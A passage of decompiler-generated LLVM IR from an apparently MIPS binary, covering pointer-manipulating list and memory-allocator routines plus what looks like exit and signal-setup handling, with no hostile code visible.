  store i32 %v1_40616c, i32* %v1_4060d0, align 4
  ret i32 %v1_406168

dec_label_pc_406174:                              ; preds = %dec_label_pc_4060fc
  %v1_406174 = add i32 %v0_406174, 4
  %v2_406174 = inttoptr i32 %v1_406174 to i32*
  %v3_406174 = load i32, i32* %v2_406174, align 4
  store i32 %v3_406174, i32* %v1.global-to-local, align 4
  %v1_40617c = icmp eq i32 %v3_406174, 0
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v1_40617c, label %dec_label_pc_406180, label %dec_label_pc_4060fc

dec_label_pc_406180:                              ; preds = %dec_label_pc_406174
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_406174, { 1, 2, 0 }
  uselistorder i32 %v0_406138, { 1, 0 }
  uselistorder i32 %v2_4060fc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_406174, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v3_406114, { 2, 1, 0 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_406160, { 1, 0 }
  uselistorder label %dec_label_pc_406154, { 1, 0 }
  uselistorder label %dec_label_pc_406138, { 1, 0 }
  uselistorder label %dec_label_pc_4060f0, { 1, 0 }
}

define i32 @function_406190(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_406190:
  %v2_406190 = add i32 %arg2, 4
  %v3_406190 = inttoptr i32 %v2_406190 to i32*
  store i32 %arg4, i32* %v3_406190, align 4
  %v1_406194 = icmp eq i32 %arg3, 0
  %v4_406194 = add i32 %arg2, 8
  %v5_406194 = inttoptr i32 %v4_406194 to i32*
  store i32 %arg3, i32* %v5_406194, align 4
  br i1 %v1_406194, label %dec_label_pc_4061a4, label %dec_label_pc_406198

dec_label_pc_406198:                              ; preds = %dec_label_pc_406190
  %v2_4061a0 = add i32 %arg3, 4
  %v3_4061a0 = inttoptr i32 %v2_4061a0 to i32*
  store i32 %arg2, i32* %v3_4061a0, align 4
  br label %dec_label_pc_4061a4

dec_label_pc_4061a4:                              ; preds = %dec_label_pc_406190, %dec_label_pc_406198
  store i32 %arg2, i32* %arg1, align 4
  %v1_4061a8 = icmp eq i32 %arg4, 0
  br i1 %v1_4061a8, label %dec_label_pc_4061b4, label %dec_label_pc_4061ac

dec_label_pc_4061ac:                              ; preds = %dec_label_pc_4061a4
  %v2_4061b0 = add i32 %arg4, 8
  %v3_4061b0 = inttoptr i32 %v2_4061b0 to i32*
  store i32 %arg2, i32* %v3_4061b0, align 4
  br label %dec_label_pc_4061b4

dec_label_pc_4061b4:                              ; preds = %dec_label_pc_4061a4, %dec_label_pc_4061ac
  %v1_4061b4 = load i32, i32* @v0, align 4
  ret i32 %v1_4061b4

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_4061b4, { 1, 0 }
  uselistorder label %dec_label_pc_4061a4, { 1, 0 }
}

define i32 @function_4061bc(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4061bc:
  %v1_4061bc = icmp eq i32 %arg3, 0
  br i1 %v1_4061bc, label %dec_label_pc_4061cc, label %dec_label_pc_4061c0

dec_label_pc_4061c0:                              ; preds = %dec_label_pc_4061bc
  %v2_4061c8 = add i32 %arg3, 4
  %v3_4061c8 = inttoptr i32 %v2_4061c8 to i32*
  store i32 %arg2, i32* %v3_4061c8, align 4
  br label %dec_label_pc_4061cc

dec_label_pc_4061cc:                              ; preds = %dec_label_pc_4061bc, %dec_label_pc_4061c0
  store i32 %arg2, i32* %arg1, align 4
  %v3_4061d0 = add i32 %arg2, 8
  %v4_4061d0 = inttoptr i32 %v3_4061d0 to i32*
  store i32 %arg3, i32* %v4_4061d0, align 4
  %v5_4061d0 = load i32, i32* @v0, align 4
  ret i32 %v5_4061d0

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_4061cc, { 1, 0 }
}

define i32 @function_4061d8(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4061d8:
  %a2.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %a2.global-to-local, align 4
  %v2_4061fc = load i32, i32* %arg1, align 4
  store i32 %v2_4061fc, i32* %s0.global-to-local, align 4
  %v1_406200 = load i32, i32* %a2.global-to-local, align 4
  %v2_406200 = add i32 %v1_406200, %arg2
  store i32 %v2_406200, i32* %t0.global-to-local, align 4
  store i32 0, i32* @t1, align 4
  %.old = load i32, i32* @v0, align 4
  %v1_40620c.old = icmp eq i32 %.old, 0
  br i1 %v1_40620c.old, label %dec_label_pc_406234, label %dec_label_pc_406210

dec_label_pc_406210:                              ; preds = %dec_label_pc_4061d8, %dec_label_pc_406210
  %v0_406214 = phi i32 [ %v3_406218, %dec_label_pc_406210 ], [ %v2_4061fc, %dec_label_pc_4061d8 ]
  store i32 %v0_406214, i32* @t1, align 4
  %v1_406218 = add i32 %v0_406214, 4
  %v2_406218 = inttoptr i32 %v1_406218 to i32*
  %v3_406218 = load i32, i32* %v2_406218, align 4
  store i32 %v3_406218, i32* %s0.global-to-local, align 4
  %v1_406220 = add i32 %v3_406218, 12
  %v1_406224 = icmp eq i32 %v3_406218, 0
  %v4_406224 = icmp ult i32 %v1_406220, %arg2
  %v1_40620c = icmp eq i1 %v4_406224, false
  %or.cond = or i1 %v1_406224, %v1_40620c
  br i1 %or.cond, label %dec_label_pc_406234, label %dec_label_pc_406210

dec_label_pc_406234:                              ; preds = %dec_label_pc_406210, %dec_label_pc_4061d8
  %v0_40626c = phi i32 [ 0, %dec_label_pc_4061d8 ], [ %v0_406214, %dec_label_pc_406210 ]
  %v0_406274 = phi i32 [ %v2_4061fc, %dec_label_pc_4061d8 ], [ %v3_406218, %dec_label_pc_406210 ]
  %v1_406234 = inttoptr i32 %v0_406274 to i32*
  %v2_406234 = load i32, i32* %v1_406234, align 4
  %v2_40623c = sub i32 %v0_406274, %v2_406234
  %v1_406240 = add i32 %v2_40623c, 12
  %v2_406244 = icmp ult i32 %v2_406200, %v1_406240
  br i1 %v2_406244, label %dec_label_pc_406304, label %dec_label_pc_40624c

dec_label_pc_40624c:                              ; preds = %dec_label_pc_406234
  %v2_406250 = icmp eq i32 %v1_406240, %v2_406200
  %v5_406250 = add i32 %v2_406234, %v1_406200
  store i32 %v5_406250, i32* %s2.global-to-local, align 4
  br i1 %v2_406250, label %dec_label_pc_406254, label %dec_label_pc_40628c

dec_label_pc_406254:                              ; preds = %dec_label_pc_40624c
  %v1_406258 = icmp ne i32 %v0_40626c, 0
  %v3_406258 = add i32 %v0_40626c, 12
  %v2_406260 = icmp eq i32 %v3_406258, %arg2
  %or.cond1 = and i1 %v1_406258, %v2_406260
  br i1 %or.cond1, label %dec_label_pc_406264, label %dec_label_pc_4062f8

dec_label_pc_406264:                              ; preds = %dec_label_pc_406254
  %v3_406268 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  store i32 %v3_406268, i32* %t9.global-to-local, align 4
  %v1_40626c = inttoptr i32 %v0_40626c to i32*
  %v2_40626c = load i32, i32* %v1_40626c, align 4
  %v1_406270 = add i32 %v0_40626c, 8
  %v2_406270 = inttoptr i32 %v1_406270 to i32*
  %v3_406270 = load i32, i32* %v2_406270, align 4
  store i32 %v3_406270, i32* %a2.global-to-local, align 4
  %v1_406278 = add i32 %v3_406268, 25020
  store i32 %v1_406278, i32* %t9.global-to-local, align 4
  %v3_40627c = add i32 %v2_40626c, %v5_406250
  store i32 %v3_40627c, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406278)
  %v0_40628c.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_40628c

dec_label_pc_40628c:                              ; preds = %dec_label_pc_40624c, %dec_label_pc_406264
  %v0_40628c = phi i32 [ %v0_406274, %dec_label_pc_40624c ], [ %v0_40628c.pre, %dec_label_pc_406264 ]
  %v1_40628c = add i32 %v0_40628c, 4
  %v2_40628c = inttoptr i32 %v1_40628c to i32*
  %v3_40628c = load i32, i32* %v2_40628c, align 4
  store i32 %v3_40628c, i32* %s1.global-to-local, align 4
  %v1_406294 = icmp eq i32 %v3_40628c, 0
  br i1 %v1_406294, label %dec_label_pc_4062d8, label %dec_label_pc_406298

dec_label_pc_406298:                              ; preds = %dec_label_pc_40628c
  %v1_40629c = inttoptr i32 %v3_40628c to i32*
  %v2_40629c = load i32, i32* %v1_40629c, align 4
  %v2_4062a4 = sub i32 %v3_40628c, %v2_40629c
  %v1_4062a8 = add i32 %v2_4062a4, 12
  %v0_4062ac = load i32, i32* %t0.global-to-local, align 4
  %v2_4062ac = icmp eq i32 %v0_4062ac, %v1_4062a8
  br i1 %v2_4062ac, label %dec_label_pc_4062b0, label %dec_label_pc_4062d8

dec_label_pc_4062b0:                              ; preds = %dec_label_pc_406298
  %v3_4062b4 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v0_4062b8 = load i32, i32* @t1, align 4
  store i32 %v0_4062b8, i32* %a2.global-to-local, align 4
  %v1_4062c0 = add i32 %v3_4062b4, 25020
  store i32 %v1_4062c0, i32* %t9.global-to-local, align 4
  %v1_4062c4 = load i32, i32* %s2.global-to-local, align 4
  %v3_4062c4 = add i32 %v1_4062c4, %v2_40629c
  store i32 %v3_4062c4, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4062c0)
  %v0_4062d4 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_4062d4, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4062d8

dec_label_pc_4062d8:                              ; preds = %dec_label_pc_406298, %dec_label_pc_40628c, %dec_label_pc_4062b0
  %v0_4062dc = phi i32 [ %v0_40628c, %dec_label_pc_406298 ], [ %v0_40628c, %dec_label_pc_40628c ], [ %v0_4062d4, %dec_label_pc_4062b0 ]
  %v3_4062d8 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_4062dc = load i32, i32* %a2.global-to-local, align 4
  %v2_4062dc = add i32 %v1_4062dc, %v0_4062dc
  store i32 %v2_4062dc, i32* %s0.global-to-local, align 4
  %v0_4062e4 = load i32, i32* @t1, align 4
  store i32 %v0_4062e4, i32* %a2.global-to-local, align 4
  %v1_4062e8 = add i32 %v3_4062d8, 24976
  store i32 %v1_4062e8, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4062e8)
  %v0_406300.pre = load i32, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_4062f8

dec_label_pc_4062f8:                              ; preds = %dec_label_pc_406254, %dec_label_pc_4062d8
  %v0_406300 = phi i32 [ %v5_406250, %dec_label_pc_406254 ], [ %v0_406300.pre, %dec_label_pc_4062d8 ]
  %v0_4062f8 = phi i32 [ %v0_406274, %dec_label_pc_406254 ], [ %v2_4062dc, %dec_label_pc_4062d8 ]
  store i32 %v0_4062f8, i32* %s1.global-to-local, align 4
  %v2_406300 = inttoptr i32 %v0_4062f8 to i32*
  store i32 %v0_406300, i32* %v2_406300, align 4
  %v0_406308.pre = load i32, i32* %t0.global-to-local, align 4
  %v0_40630c.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_406304

dec_label_pc_406304:                              ; preds = %dec_label_pc_406234, %dec_label_pc_4062f8
  %v0_40630c = phi i32 [ %v1_406200, %dec_label_pc_406234 ], [ %v0_40630c.pre, %dec_label_pc_4062f8 ]
  %v0_406308 = phi i32 [ %v2_406200, %dec_label_pc_406234 ], [ %v0_406308.pre, %dec_label_pc_4062f8 ]
  %v3_406304 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  store i32 %v3_406304, i32* %t9.global-to-local, align 4
  %v1_406308 = add i32 %v0_406308, -12
  store i32 %v1_406308, i32* %s1.global-to-local, align 4
  %v3_40630c = inttoptr i32 %v1_406308 to i32*
  store i32 %v0_40630c, i32* %v3_40630c, align 4
  %v0_406310 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_406310, i32* @a3, align 4
  %v0_406314 = load i32, i32* @t1, align 4
  store i32 %v0_406314, i32* %a2.global-to-local, align 4
  %v0_406318 = load i32, i32* %t9.global-to-local, align 4
  %v1_406318 = add i32 %v0_406318, 24976
  store i32 %v1_406318, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406318)
  %v0_406328 = load i32, i32* %s1.global-to-local, align 4
  ret i32 %v0_406328

; uselistorder directives
  uselistorder i32 %v0_4062f8, { 1, 0 }
  uselistorder i32 %v3_40628c, { 1, 0, 2, 3 }
  uselistorder i32 %v5_406250, { 1, 0, 2 }
  uselistorder i32 %v0_406274, { 0, 1, 3, 2 }
  uselistorder i32 %v0_40626c, { 1, 0, 3, 2 }
  uselistorder i32 %v3_406218, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_406214, { 0, 2, 1 }
  uselistorder i32 %v1_406200, { 2, 0, 1 }
  uselistorder i32 %v2_4061fc, { 1, 0, 2 }
  uselistorder i32* %s2.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %s0.global-to-local, { 3, 4, 5, 1, 0, 2 }
  uselistorder i32* %a2.global-to-local, { 2, 3, 4, 6, 5, 7, 0, 1 }
  uselistorder i32* @t1, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_406304, { 1, 0 }
  uselistorder label %dec_label_pc_4062f8, { 1, 0 }
  uselistorder label %dec_label_pc_4062d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_40628c, { 1, 0 }
  uselistorder label %dec_label_pc_406210, { 1, 0 }
}

define i32 @function_406350(i32 %arg1) local_unnamed_addr {
dec_label_pc_406350:
  %s1.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_406358 = load i32, i32* @t9, align 4
  %v3_406374 = load i32, i32* @global_var_4493ec.300, align 4
  %v2_40637c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_40637c, i32* @s0, align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  %v5_406384 = call i32 @function_40674c(i32 %v2_40637c, i32 %v3_406374)
  %v3_406398 = load i32, i32* @global_var_449308, align 4
  %v2_40639c = call i32 @function_406744(i32 %v3_406398)
  %v1_4063ac = add i32 %v1_406358, 274104
  %v2_4063ac = inttoptr i32 %v1_4063ac to i32*
  %v3_4063ac = load i32, i32* %v2_4063ac, align 4
  store i32 %v3_4063ac, i32* @v0, align 4
  %v1_4063b4 = inttoptr i32 %v3_4063ac to i32*
  %v2_4063b4 = load i32, i32* %v1_4063b4, align 4
  %v1_4063bc = icmp eq i32 %v2_4063b4, 0
  br i1 %v1_4063bc, label %dec_label_pc_4063d4, label %dec_label_pc_4063c0

dec_label_pc_4063c0:                              ; preds = %dec_label_pc_406350
  store i32 ptrtoint (i32* @global_var_4063cc.341 to i32), i32* @ra, align 4
  call void @__pseudo_call(i32 %v2_4063b4)
  br label %dec_label_pc_4063d4

dec_label_pc_4063d4:                              ; preds = %dec_label_pc_406350, %dec_label_pc_4063c0
  %v3_4063dc = call i32 @function_40674c(i32 %v2_40637c, i32 1)
  %v3_4063ec = load i32, i32* @global_var_4494a4.342, align 4
  store i32 %v3_4063ec, i32* @t9, align 4
  %v1_4063f4 = call i32 @function_406680()
  %v3_406404 = load i32, i32* @global_var_449310.343, align 4
  %v1_40640c = icmp eq i32 %v3_406404, 0
  br i1 %v1_40640c, label %dec_label_pc_40642c, label %dec_label_pc_406410

dec_label_pc_406410:                              ; preds = %dec_label_pc_4063d4
  %v1_40641c = call i32 @unknown_0()
  br label %dec_label_pc_40642c

dec_label_pc_40642c:                              ; preds = %dec_label_pc_4063d4, %dec_label_pc_406410
  %v3_40642c = load i32, i32* @global_var_449330.344, align 4
  store i32 %v3_40642c, i32* @t9, align 4
  %v1_406434 = load i32, i32* %s1.global-to-local, align 4
  %v3_406434 = call i32 @function_406d20(i32 %v1_406434)
  unreachable

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_40674c, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_40642c, { 1, 0 }
  uselistorder label %dec_label_pc_4063d4, { 1, 0 }
}

define i32 @function_406440(i32 %arg1) local_unnamed_addr {
dec_label_pc_406440:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %tmp6 = alloca i32, align 4
  %tmp8 = alloca i32, align 4
  %tmp9 = alloca i32, align 4
  %tmp10 = alloca i32, align 4
  %v1_406448 = load i32, i32* @t9, align 4
  %v2_406448 = add i32 %v1_406448, 306576
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  %v4_406460 = ptrtoint i32* %tmp6 to i32
  %v1_406468 = icmp eq i32 %arg1, 0
  store i32 32, i32* %v1.global-to-local, align 4
  br i1 %v1_406468, label %dec_label_pc_40664c, label %dec_label_pc_40646c

dec_label_pc_40646c:                              ; preds = %dec_label_pc_406440
  %v2_406474 = ptrtoint i32* %tmp8 to i32
  store i32 %v2_406474, i32* %a1.global-to-local, align 4
  %v0_406478.pre = load i32, i32* @v0, align 4
  br label %dec_label_pc_406478

dec_label_pc_406478:                              ; preds = %dec_label_pc_406478, %dec_label_pc_40646c
  %v0_406478 = phi i32 [ %v4_406484, %dec_label_pc_406478 ], [ %v0_406478.pre, %dec_label_pc_40646c ]
  %v1_406478 = add i32 %v0_406478, 8
  %v2_406478 = inttoptr i32 %v1_406478 to i32*
  store i32 0, i32* %v2_406478, align 4
  %v0_40647c = load i32, i32* %v1.global-to-local, align 4
  %v1_40647c = add i32 %v0_40647c, -1
  store i32 %v1_40647c, i32* %v1.global-to-local, align 4
  %v1_406480 = mul i32 %v1_40647c, 4
  %v1_406484 = icmp sgt i32 %v1_40647c, -1
  %v3_406484 = load i32, i32* %a1.global-to-local, align 4
  %v4_406484 = add i32 %v3_406484, %v1_406480
  store i32 %v4_406484, i32* %v0.global-to-local, align 4
  br i1 %v1_406484, label %dec_label_pc_406478, label %dec_label_pc_406488

dec_label_pc_406488:                              ; preds = %dec_label_pc_406478
  %v3_40648c = load i32, i32* @global_var_449400.313, align 4
  store i32 %v3_40648c, i32* @t9, align 4
  %v2_406490 = ptrtoint i32* %tmp9 to i32
  store i32 %arg1, i32* %tmp8, align 4
  store i32 %v2_406490, i32* %a0.global-to-local, align 4
  store i32 18, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40648c)
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  %v0_4064ac = load i32, i32* %v0.global-to-local, align 4
  %v1_4064ac = icmp slt i32 %v0_4064ac, 0
  %v4_4064ac = ptrtoint i32* %tmp10 to i32
  store i32 %v4_4064ac, i32* %s0.global-to-local, align 4
  br i1 %v1_4064ac, label %dec_label_pc_406654, label %dec_label_pc_4064b0

dec_label_pc_4064b0:                              ; preds = %dec_label_pc_406488
  %v3_4064b4 = load i32, i32* @global_var_4493d0.346, align 4
  store i32 %v3_4064b4, i32* @t9, align 4
  store i32 %v2_406490, i32* %a1.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4064b4)
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  %v0_4064cc = load i32, i32* %v0.global-to-local, align 4
  %v1_4064cc = icmp eq i32 %v0_4064cc, 0
  store i32 -1, i32* %v0.global-to-local, align 4
  br i1 %v1_4064cc, label %dec_label_pc_4064d0, label %dec_label_pc_406658

dec_label_pc_4064d0:                              ; preds = %dec_label_pc_4064b0
  %v3_4064d4 = load i32, i32* @global_var_449364.314, align 4
  store i32 %v4_4064ac, i32* %a0.global-to-local, align 4
  store i32 18, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4064d4)
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  %v0_4064e8 = load i32, i32* %v0.global-to-local, align 4
  %v1_4064e8 = icmp eq i32 %v0_4064e8, 0
  store i32 32, i32* %v1.global-to-local, align 4
  br i1 %v1_4064e8, label %dec_label_pc_4064ec, label %dec_label_pc_4064d0.dec_label_pc_406610_crit_edge

dec_label_pc_4064d0.dec_label_pc_406610_crit_edge: ; preds = %dec_label_pc_4064d0
  %v3_406614.pre = load i32, i32* @global_var_4493f8.353, align 4
  br label %dec_label_pc_406610

dec_label_pc_4064ec:                              ; preds = %dec_label_pc_4064d0
  store i32 %v2_406474, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4064f8

dec_label_pc_4064f8:                              ; preds = %dec_label_pc_4064f8, %dec_label_pc_4064ec
  %v0_4064f8 = phi i32 [ %v4_406504, %dec_label_pc_4064f8 ], [ 0, %dec_label_pc_4064ec ]
  %v1_4064f8 = add i32 %v0_4064f8, 8
  %v2_4064f8 = inttoptr i32 %v1_4064f8 to i32*
  store i32 0, i32* %v2_4064f8, align 4
  %v0_4064fc = load i32, i32* %v1.global-to-local, align 4
  %v1_4064fc = add i32 %v0_4064fc, -1
  store i32 %v1_4064fc, i32* %v1.global-to-local, align 4
  %v1_406500 = mul i32 %v1_4064fc, 4
  %v1_406504 = icmp sgt i32 %v1_4064fc, -1
  %v3_406504 = load i32, i32* %a0.global-to-local, align 4
  %v4_406504 = add i32 %v3_406504, %v1_406500
  store i32 %v4_406504, i32* %v0.global-to-local, align 4
  br i1 %v1_406504, label %dec_label_pc_4064f8, label %dec_label_pc_406508

dec_label_pc_406508:                              ; preds = %dec_label_pc_4064f8
  %v3_40650c = load i32, i32* @global_var_449400.313, align 4
  store i32 %v3_40650c, i32* @t9, align 4
  store i32 %v2_406490, i32* %a0.global-to-local, align 4
  store i32 18, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40650c)
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  %v0_406520 = load i32, i32* %v0.global-to-local, align 4
  %v1_406520 = icmp slt i32 %v0_406520, 0
  store i32 18, i32* %a0.global-to-local, align 4
  br i1 %v1_406520, label %dec_label_pc_406654, label %dec_label_pc_406524

dec_label_pc_406524:                              ; preds = %dec_label_pc_406508
  %v3_406528 = load i32, i32* @global_var_4494b4.317, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406528)
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  %v0_40653c = load i32, i32* %v0.global-to-local, align 4
  %v1_40653c = icmp sgt i32 %v0_40653c, -1
  store i32 %v2_406474, i32* %s0.global-to-local, align 4
  br i1 %v1_40653c, label %dec_label_pc_4065e8, label %dec_label_pc_406540

dec_label_pc_406540:                              ; preds = %dec_label_pc_406524
  %v3_406544 = load i32, i32* @global_var_4492e0.256, align 4
  call void @__pseudo_call(i32 %v3_406544)
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  %v3_40655c = load i32, i32* @global_var_4493d0.346, align 4
  store i32 %v4_4064ac, i32* %a1.global-to-local, align 4
  %v0_406568 = load i32, i32* %v0.global-to-local, align 4
  %v1_406568 = inttoptr i32 %v0_406568 to i32*
  %v2_406568 = load i32, i32* %v1_406568, align 4
  store i32 %v0_406568, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40655c)
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_406580 = inttoptr i32 %v0_406568 to i32*
  store i32 %v2_406568, i32* %v2_406580, align 4
  %v0_406598.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4065e8

dec_label_pc_4065e8:                              ; preds = %dec_label_pc_406524, %dec_label_pc_406540
  %v0_406598 = phi i32 [ %v2_406474, %dec_label_pc_406524 ], [ %v0_406598.pre, %dec_label_pc_406540 ]
  store i32 1, i32* %v0.global-to-local, align 4
  %v3_406594 = load i32, i32* @global_var_4493f8.353, align 4
  store i32 %v0_406598, i32* %a0.global-to-local, align 4
  store i32 %v0_406598, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406594)
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  %v3_4065ac = load i32, i32* @global_var_4492e0.256, align 4
  call void @__pseudo_call(i32 %v3_4065ac)
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  store i32 %v4_4064ac, i32* %a1.global-to-local, align 4
  %v3_4065c4 = load i32, i32* @global_var_4493d0.346, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  %v0_4065d0 = load i32, i32* %v0.global-to-local, align 4
  %v1_4065d0 = inttoptr i32 %v0_4065d0 to i32*
  %v2_4065d0 = load i32, i32* %v1_4065d0, align 4
  store i32 %v2_4065d0, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4065c4)
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  %v2_4065e4 = inttoptr i32 %v0_4065d0 to i32*
  store i32 %v2_4065d0, i32* %v2_4065e4, align 4
  %v0_4065e8 = load i32, i32* %gp.global-to-local, align 4
  %v1_4065e8 = add i32 %v0_4065e8, -32256
  %v2_4065e8 = inttoptr i32 %v1_4065e8 to i32*
  %v3_4065e8 = load i32, i32* %v2_4065e8, align 4
  store i32 %v4_4064ac, i32* %a1.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4065e8)
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  %v0_406600 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_406600, i32* %a0.global-to-local, align 4
  %v3_406604 = load i32, i32* @global_var_4493f8.353, align 4
  store i32 %v0_406600, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_406610

dec_label_pc_406610:                              ; preds = %dec_label_pc_4064d0.dec_label_pc_406610_crit_edge, %dec_label_pc_4065e8
  %v3_406614 = phi i32 [ %v3_406614.pre, %dec_label_pc_4064d0.dec_label_pc_406610_crit_edge ], [ %v3_406604, %dec_label_pc_4065e8 ]
  store i32 %v2_406474, i32* %a0.global-to-local, align 4
  store i32 %v3_406614, i32* @t9, align 4
  store i32 %v2_406474, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406614)
  store i32 %v2_406448, i32* %gp.global-to-local, align 4
  %v0_406628 = load i32, i32* %v0.global-to-local, align 4
  %v1_40662c = icmp eq i32 %v0_406628, 0
  store i32 499974144, i32* %v1.global-to-local, align 4
  br i1 %v1_40662c, label %dec_label_pc_40664c, label %dec_label_pc_406630

dec_label_pc_406630:                              ; preds = %dec_label_pc_406610
  %v3_406640 = load i32, i32* %tmp8, align 4
  store i32 %v3_406640, i32* %v1.global-to-local, align 4
  store i32 %v3_406640, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40664c

dec_label_pc_40664c:                              ; preds = %dec_label_pc_406610, %dec_label_pc_406440, %dec_label_pc_406630
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_406654

dec_label_pc_406654:                              ; preds = %dec_label_pc_406508, %dec_label_pc_406488, %dec_label_pc_40664c
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_406658

dec_label_pc_406658:                              ; preds = %dec_label_pc_4064b0, %dec_label_pc_406654
  store i32 %v4_406460, i32* @s0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v3_406614, { 1, 0 }
  uselistorder i32 %v0_406598, { 1, 0 }
  uselistorder i32 %v4_406504, { 1, 0 }
  uselistorder i32 %v1_4064fc, { 1, 0, 2 }
  uselistorder i32 %v4_4064ac, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_406484, { 1, 0 }
  uselistorder i32 %v1_40647c, { 1, 0, 2 }
  uselistorder i32 %v2_406474, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v2_406448, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 12 }
  uselistorder i32* %tmp8, { 2, 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 10, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* @global_var_4493f8.353, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_406658, { 1, 0 }
  uselistorder label %dec_label_pc_406654, { 2, 0, 1 }
  uselistorder label %dec_label_pc_40664c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_406610, { 1, 0 }
  uselistorder label %dec_label_pc_4065e8, { 1, 0 }
}

define i32 @function_406680() local_unnamed_addr {
dec_label_pc_406680:
  %s0.global-to-local = alloca i32, align 4
  %v1_406688 = load i32, i32* @t9, align 4
  %v0_406694 = load i32, i32* @s0, align 4
  %v1_40669c = add i32 %v1_406688, 273292
  %v2_40669c = inttoptr i32 %v1_40669c to i32*
  %v3_40669c = load i32, i32* %v2_40669c, align 4
  %v3_4066a0 = load i32, i32* @global_var_44920c, align 4
  %v2_4066a8 = sub i32 %v3_40669c, %v3_4066a0
